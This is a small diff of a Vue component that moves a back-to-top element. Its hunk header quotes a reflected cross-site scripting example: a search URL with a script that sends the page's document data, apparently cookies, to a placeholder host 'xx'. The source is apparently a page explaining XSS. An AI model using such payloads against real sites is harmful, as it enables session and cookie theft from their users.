@@ -208,8 +208,8 @@ http://www.shop.com/search?query=&lt;script>document.location='http://xx?c='+doc
 
         </main>
         <Wall />
-        <BackToTop />
     </div>
+    <BackToTop />
 </template>
 <script>
     import Header from "@/components/Header.vue";
